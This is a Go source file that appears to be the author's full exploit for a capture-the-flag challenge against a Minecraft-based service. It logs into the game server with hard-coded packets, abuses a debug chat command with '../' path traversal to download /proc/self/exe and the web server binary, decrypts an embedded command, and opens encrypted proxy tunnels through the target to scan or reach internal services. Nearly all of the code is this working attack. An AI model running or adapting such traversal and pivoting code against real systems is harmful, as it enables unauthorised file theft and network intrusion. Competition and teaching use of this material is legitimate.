/**
* @Author: impakho
* @Date: 2020/04/13
* @Github: https://github.com/impakho
*/

package main

import (
	"bytes"
	"crypto/cipher"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"golang.org/x/crypto/chacha20"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

const COPYRIGHT_AUTHOR = "impakho"
const COPYRIGHT_DATE = "2020/04/13"
const COPYRIGHT_GITHUB = "https://github.com/impakho"

// PLEASE MODIFY THIS
const MINECRAFT_ADDR = "134.175.230.10:25565"
const PLAYER_NAME = "Steve"
const READ_WAIT_TIME = 5 // seconds
const MC2020_WEB_ADDR = "http://134.175.230.10:80"
const WEB_PROXY_REMOTE_ADDR = "134.175.230.10:80"
const WEB_PROXY_LOCAL_ADDR = "127.0.0.1:9090"
const REALWORLD_PROXY_REMOTE_ADDR = "134.175.230.10:8080"
const REALWORLD_PROXY_LOCAL_ADDR = "127.0.0.1:8080"

const DEBUG = false
var connection net.Conn
var connDataBuffer = make([]byte, 0)
var connDataLock sync.Mutex
type Message struct {
	Text string
	Extra []Message
}
var MessageBuffer = ""
var KEY = Sha256([]byte("de1ctf-mc2020"))
var NONCE = Sha256([]byte("de1ta-team"))[:24]

func main() {
	fmt.Println("[mc_ticktock] exploit")
	fmt.Println("Please modify the config in this file.")
	if len(os.Args) < 2 {
		log.Fatal("Use args -s1 / -s2 / -s3 / -s4 / -s5 to choose a step.")
	}
	Init()
	if os.Args[1] == "-s1" {
		// Step One: Read /proc/self/exe
		InitConn()
		StepOne()
		CloseConn()
	}else if os.Args[1] == "-s2" {
		// Step Two: Read /proc/self/cwd/webserver
		InitConn()
		StepTwo()
		CloseConn()
	}else if os.Args[1] == "-s3" {
		// Step Three: Decrypt cipher-text with Modified-SM4 Cipher
		fmt.Println(StepThree())
	}else if os.Args[1] == "-s4" {
		// Step Four: Setup web proxy (load http page or do a TCP scanning)
		StepFour()
	}else if os.Args[1] == "-s5" {
		// Step Four: Setup realworld proxy (connect to realworld game service)
		StepFive()
	}else{
		log.Fatal("No such step.")
	}
}

func StepOne() {
	fmt.Println(fmt.Sprintf("Reading would wait READ_WAIT_TIME(%d seconds) per 1MB reading.", READ_WAIT_TIME))
	fmt.Println("Please increase READ_WAIT_TIME if your local network status is not good.")
	result := ReadFile("../../../../../../../proc/self/exe")
	f, err := os.Create("./mc2020")
	if err != nil {
		log.Fatal(err)
	}
	_, err = f.Write(result)
	if err != nil {
		log.Fatal(err)
	}
	f.Close()
	fmt.Println("Success read and write to ./mc2020")
}

func StepTwo() {
	fmt.Println(fmt.Sprintf("Reading would wait READ_WAIT_TIME(%d seconds) per 1MB reading.", READ_WAIT_TIME))
	fmt.Println("Please increase READ_WAIT_TIME if your local network status is not good.")
	result := ReadFile("../../../../../../../proc/self/cwd/webserver")
	f, err := os.Create("./webserver")
	if err != nil {
		log.Fatal(err)
	}
	_, err = f.Write(result)
	if err != nil {
		log.Fatal(err)
	}
	f.Close()
	fmt.Println("Success read and write to ./webserver")
}

func StepThree() string {
	cipher_text := []byte{164, 163, 4, 185, 30, 241, 150, 198, 10, 38, 77, 233, 175, 253, 177, 255, 6, 238, 229, 207, 107, 46, 12, 2, 23, 106, 151, 183, 149, 172, 184, 17, 26, 143, 19, 131, 229, 175, 103, 201, 106, 38, 153, 43, 28, 173, 63, 65, 223, 170, 54, 54, 8, 162, 4, 157}
	c, _ := NewCipher(KEY[:16])
	s := cipher.NewCFBDecrypter(c, NONCE[:16])
	buff := make([]byte, len(cipher_text))
	s.XORKeyStream(buff, cipher_text)
	return string(buff)
}

func StepFour() {
	go func() {
		for {
			http.Get(MC2020_WEB_ADDR + "/ticktock?text=" + url.QueryEscape(StepThree()))
			time.Sleep(3 * time.Second)
		}
	}()
	listener, err := net.Listen("tcp", WEB_PROXY_LOCAL_ADDR)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("local web proxy started.")
	fmt.Println("proxy tunnel will expired every 20 minutes. (auto keep-alive)")
	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go HandleWebProxyConn(conn)
	}
}

func StepFive() {
	go func() {
		for {
			http.Get(MC2020_WEB_ADDR + "/ticktock?text=" + url.QueryEscape(StepThree()))
			time.Sleep(3 * time.Second)
		}
	}()
	listener, err := net.Listen("tcp", REALWORLD_PROXY_LOCAL_ADDR)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("local realworld proxy started.")
	fmt.Println("proxy tunnel will expired every 20 minutes. (auto keep-alive)")
	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go HandleRealWorldProxyConn(conn)
	}
}

func HandleWebProxyConn(conn net.Conn) {
	remoteAddr := ""
	buff := make([]byte, 0)
	for {
		buf := make([]byte, 2048)
		n, err := conn.Read(buf)
		if err != nil {
			conn.Close()
			return
		}
		if n <= 0 {
			continue
		}
		buf = buf[:n]
		buff = append(buff, buf...)
		if bytes.Contains(buff, []byte("\r\n\r\n")) {
			sep1 := bytes.Split(buff, []byte("\r\n\r\n"))
			if bytes.Contains(sep1[0], []byte(" ")) {
				remoteAddr = string(bytes.Split(sep1[0], []byte(" "))[1])
			}
			if bytes.HasPrefix(sep1[0], []byte("CONNECT ")) {
				conn.Write([]byte("HTTP/1.1 200 Connection Established\r\n\r\n"))
				buff = make([]byte, 0)
				continue
			}else if bytes.Contains(sep1[0], []byte("\r\nContent-Length: ")) {
				sep2 := bytes.Split(sep1[0], []byte("\r\nContent-Length: "))
				if bytes.Contains(sep2[1], []byte("\r\n")) {
					sep3 := bytes.Split(sep2[1], []byte("\r\n"))
					n, err := strconv.Atoi(string(sep3[0]))
					if err != nil {
						break
					}
					if len(sep1) >= n {
						break
					}
				}else{
					break
				}
			}else if bytes.Contains(sep1[0], []byte("\r\nTransfer-Encoding: chunked")) {
				if bytes.Contains(sep1[1], []byte("\r\n\r\n")) {
					break
				}
			}else{
				break
			}
		}
	}
	urls, err := url.Parse(remoteAddr)
	if err == nil {
		remoteAddr = urls.Host
		if !strings.Contains(remoteAddr, ":") {
			if urls.Scheme == "https" {
				remoteAddr += ":443"
			}else{
				remoteAddr += ":80"
			}
		}
		buff = bytes.Replace(buff, []byte(fmt.Sprintf("%s://%s", urls.Scheme, urls.Host)), []byte(""), 1)
	}
	rconn, err := net.Dial("tcp", WEB_PROXY_REMOTE_ADDR)
	if err != nil {
		conn.Close()
		return
	}
	cipher, _ := chacha20.NewUnauthenticatedCipher(KEY[:], NONCE[:])
	body := []byte(remoteAddr + "|")
	body = append(body, buff...)
	data := make([]byte, len(body))
	cipher.XORKeyStream(data, body)
	rconn.Write([]byte(fmt.Sprintf("POST /webproxy HTTP/1.1\r\nContent-Length: %d\r\nHost: 127.0.0.1\r\n\r\n%s", len(data), data)))
	buffer := make([]byte, 0)
	connect_succ := false
	for {
		buff := make([]byte, 2048)
		n, err := rconn.Read(buff)
		if err != nil {
			conn.Close()
			rconn.Close()
			return
		}
		if n <= 0 {
			continue
		}
		buff = buff[:n]
		if !connect_succ {
			buffer = append(buffer, buff...)
			if bytes.Contains(buffer, []byte("\r\n\r\n")) {
				sep := bytes.Split(buffer, []byte("\r\n\r\n"))
				if bytes.Contains(sep[0], []byte(" 200 OK\r\n")) {
					connect_succ = true
					_, err = conn.Write(buffer[len(sep[0]) + 4:])
					if err != nil {
						conn.Close()
						rconn.Close()
						return
					}
					buffer = make([]byte, 0)
					continue
				}else{
					_, err = conn.Write(buffer)
					conn.Close()
					rconn.Close()
					return
				}
			}
		}else{
			_, err = conn.Write(buff)
			if err != nil {
				conn.Close()
				rconn.Close()
				return
			}
		}
	}
}

func HandleRealWorldProxyConn(conn net.Conn) {
	rconn, err := net.Dial("tcp", REALWORLD_PROXY_REMOTE_ADDR)
	if err != nil {
		conn.Close()
		return
	}
	go func() {
		cipher, _ := chacha20.NewUnauthenticatedCipher(KEY[:], NONCE[:])
		for {
			buff := make([]byte, 2048)
			n, err := conn.Read(buff)
			if err != nil {
				conn.Close()
				rconn.Close()
				return
			}
			if n <= 0 {
				continue
			}
			buff = buff[:n]
			data := make([]byte, len(buff))
			cipher.XORKeyStream(data, buff)
			_, err = rconn.Write(data)
			if err != nil {
				conn.Close()
				rconn.Close()
				return
			}
		}
	}()
	cipher, _ := chacha20.NewUnauthenticatedCipher(KEY[:], NONCE[:])
	for {
		buff := make([]byte, 2048)
		n, err := rconn.Read(buff)
		if err != nil {
			conn.Close()
			rconn.Close()
			return
		}
		if n <= 0 {
			continue
		}
		buff = buff[:n]
		data := make([]byte, len(buff))
		cipher.XORKeyStream(data, buff)
		_, err = conn.Write(data)
		if err != nil {
			conn.Close()
			rconn.Close()
			return
		}
	}
}

func Sha256(bytes []byte) []byte {
	sum := sha256.Sum256(bytes)
	return sum[:]
}

func ReadFile(path string) []byte {
	file := make([]byte, 0)
	offset := 0
	for {
		result := []byte(SendMessage(connection, fmt.Sprintf("/MC2020-DEBUG-VIEW:-) %s %d", path, offset)))
		sep := bytes.Split(result, []byte("\n"))
		if bytes.Contains(sep[1], []byte("error")) || bytes.Contains(sep[1], []byte("not found")) || bytes.Equal(sep[1], []byte("EOF")) {
			break
		}
		tmp, err := base64.StdEncoding.DecodeString(string(sep[1]))
		if err != nil {
			return file
		}
		offset += len(tmp)
		file = append(file, tmp...)
	}
	return file
}

func InitConn() {
	var err error
	connection, err = net.Dial("tcp", MINECRAFT_ADDR)
	if err != nil {
		log.Fatal(err)
	}
	// Read Conn Data
	go func() {
		for {
			buff := make([]byte, 4096)
			n ,err := connection.Read(buff)
			if err != nil {
				connection.Close()
				break
			}
			buff = buff[:n]
			connDataLock.Lock()
			connDataBuffer = append(connDataBuffer, buff...)
			connDataLock.Unlock()
			if DEBUG {
				fmt.Println(hex.Dump(buff))
			}
		}
	}()
	// Handle Conn Data
	go func() {
		length := VarInt(0)
		pkt := make([]byte, 0)
		for {
			connDataLock.Lock()
			if len(connDataBuffer) > 0 {
				pkt = append(pkt, connDataBuffer...)
				connDataBuffer = make([]byte, 0)
			}
			connDataLock.Unlock()
			// Handle Data by Length
			buffer := bytes.NewBuffer(pkt)
			err := length.Decode(buffer)
			if err != nil {
				time.Sleep(10 * time.Millisecond)
				continue
			}
			b := buffer.Bytes()
			if length <= 0 {
				pkt = pkt[1:]
			}
			if length > 0 && length <= VarInt(len(b)) {
				go HandlePacket(connection, b[:length][:])
				pkt = pkt[int64(len(pkt) - len(b)) + int64(length):]
			}
		}
	}()
	var data []byte

	data = Handshake()
	connection.Write(data)
	fmt.Println(hex.Dump(data))

	data = LoginStart()
	connection.Write(data)
	fmt.Println(hex.Dump(data))

	time.Sleep(1 * time.Second)

	data = ClientSettings()
	connection.Write(data)
	fmt.Println(hex.Dump(data))

	data = PluginMessage()
	connection.Write(data)
	fmt.Println(hex.Dump(data))

	time.Sleep(1 * time.Second)
}

func CloseConn() {
	connection.Close()
}

func SendMessage(conn net.Conn, msg string) string {
	MessageBuffer = ""
	data := ChatMessage(msg)
	conn.Write(data)
	timeout := 0
	for {
		if len(MessageBuffer) > 0 {
			time.Sleep(READ_WAIT_TIME * time.Second)
			tmp := MessageBuffer
			MessageBuffer = ""
			return tmp
		}
		if timeout >= 30 {
			break
		}
		timeout++
		time.Sleep(100 * time.Millisecond)
	}
	return ""
}

func HandlePacket(conn net.Conn, packet []byte) {
	/* keep-alive
	References:
		https://wiki.vg/index.php?title=Protocol&oldid=13223#Keep_Alive_.28serverbound.29
		https://wiki.vg/index.php?title=Protocol&oldid=13223#Keep_Alive_.28clientbound.29
	*/
	if packet[0] == 0x1f {
		// send keep-alive response
		pkt := make([]byte, 0)
		pkt = append(pkt, 0x0c)
		pkt = append(pkt, packet[1:]...)
		pkt = append(VarInt(len(pkt)).Encode(), pkt...)
		conn.Write(pkt)
		if DEBUG {
			fmt.Println(hex.Dump(pkt))
		}
		return
	}
	/* chat message
	Reference: https://wiki.vg/index.php?title=Protocol&oldid=13223#Chat_Message_.28clientbound.29
	*/
	if packet[0] == 0x0f {
		var json_str String
		err := json_str.Decode(bytes.NewBuffer(packet[1:len(packet) - 1]))
		if err != nil {
			return
		}
		var message Message
		err = json.Unmarshal([]byte(json_str), &message)
		if err != nil {
			return
		}
		text := message.Text
		for _, k := range message.Extra {
			text += k.Text
		}
		MessageBuffer += text + "\n"
		return
	}
}

func ParseAddr(addr string) (ip string, port uint16, err error) {
	sep := strings.Split(addr, ":")
	tip := net.ParseIP(sep[0])
	tport, err := strconv.Atoi(sep[1])
	if tip == nil || err != nil || tport < 1 || tport > 65535 {
		return ip, port, errors.New("invalid addr format")
	}
	return tip.String(), uint16(tport), nil
}

func Handshake() []byte {
	// Reference: https://wiki.vg/index.php?title=Protocol&oldid=13223#Handshake
	id := []byte{0x00}
	protocol_version := VarInt(997).Encode()
	ip, port, err := ParseAddr(MINECRAFT_ADDR)
	if err != nil {
		return nil
	}
	server_address := String(ip).Encode()
	server_port := UnsignedShort(port).Encode()
	state := []byte{0x02}
	pkt := make([]byte, 0)
	pkt = append(pkt, id...)
	pkt = append(pkt, protocol_version...)
	pkt = append(pkt, server_address...)
	pkt = append(pkt, server_port...)
	pkt = append(pkt, state...)
	pkt = append(VarInt(len(pkt)).Encode(), pkt...)
	return pkt
}

func LoginStart() []byte {
	// Reference: https://wiki.vg/index.php?title=Protocol&oldid=13223#Login_Start
	id := []byte{0x00}
	name := String(PLAYER_NAME).Encode()
	pkt := make([]byte, 0)
	pkt = append(pkt, id...)
	pkt = append(pkt, name...)
	pkt = append(VarInt(len(pkt)).Encode(), pkt...)
	return pkt
}

func ClientSettings() []byte {
	// Reference: https://wiki.vg/index.php?title=Protocol&oldid=13223#Client_Settings
	id := []byte{0x05}
	locale := String("en_us").Encode()
	view_distance := Byte(12).Encode()
	chat_mode := VarInt(0).Encode()
	chat_colors := Boolean(true).Encode()
	displayed_skin_parts := UnsignedByte(0x7f).Encode()
	main_hand := VarInt(1).Encode()
	pkt := make([]byte, 0)
	pkt = append(pkt, id...)
	pkt = append(pkt, locale...)
	pkt = append(pkt, view_distance...)
	pkt = append(pkt, chat_mode...)
	pkt = append(pkt, chat_colors...)
	pkt = append(pkt, displayed_skin_parts...)
	pkt = append(pkt, main_hand...)
	pkt = append(VarInt(len(pkt)).Encode(), pkt...)
	return pkt
}

func PluginMessage() []byte {
	// Reference: https://wiki.vg/index.php?title=Protocol&oldid=13223#Plugin_Message_.28serverbound.29
	id := []byte{0x0A}
	channel := String("MC|Brand").Encode()
	data := ByteArray([]byte("vanilla")).Encode()
	pkt := make([]byte, 0)
	pkt = append(pkt, id...)
	pkt = append(pkt, channel...)
	pkt = append(pkt, data...)
	pkt = append(VarInt(len(pkt)).Encode(), pkt...)
	return pkt
}

func ChatMessage(str string) []byte {
	// Reference: https://wiki.vg/index.php?title=Protocol&oldid=13223#Chat_Message_.28serverbound.29
	id := []byte{0x03}
	message := String(str).Encode()
	pkt := make([]byte, 0)
	pkt = append(pkt, id...)
	pkt = append(pkt, message...)
	pkt = append(VarInt(len(pkt)).Encode(), pkt...)
	return pkt
}